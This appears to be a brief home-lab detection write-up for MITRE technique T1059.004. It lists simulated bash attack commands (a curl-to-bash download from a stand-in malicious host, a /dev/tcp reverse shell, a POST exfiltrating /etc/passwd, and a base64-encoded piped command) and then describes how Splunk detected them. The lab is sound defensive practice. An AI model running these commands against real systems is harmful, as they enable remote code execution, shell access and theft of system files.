🎯 MITRE Technique: T1059.004 – Command and Scripting Interpreter (Bash)

📆 Date: 23/06/2025
🖥️ Host: ubuntu-vm (192.168.177.x)
👤 User: lief

🎭 Attack Summary:
Simulated malicious bash commands:

curl http://malicious.com/script.sh | bash

bash -i >& /dev/tcp/192.168.56.1/4444 0>&1

cat /etc/passwd && curl -X POST -d @/etc/passwd http://attacker.com/loot

echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | bash

🧠 Impact:
These commands represent real-world payload delivery, reverse shells, and data exfiltration using Linux interpreters.

🔍 Detection:
Splunk queries were crafted to identify:

Pipe-based execution (|, &&)

Reverse shell syntax (/dev/tcp)

Base64 encoded payloads

Suspicious usage of curl + bash

🛡️ Outcome:
All attack commands were successfully detected in .bash_history and syslog, correlated through Splunk.

✅ Recommendation:

Monitor and alert on piped/bash and encoded execution

Limit /dev/tcp access

Harden .bashrc and shell profiles
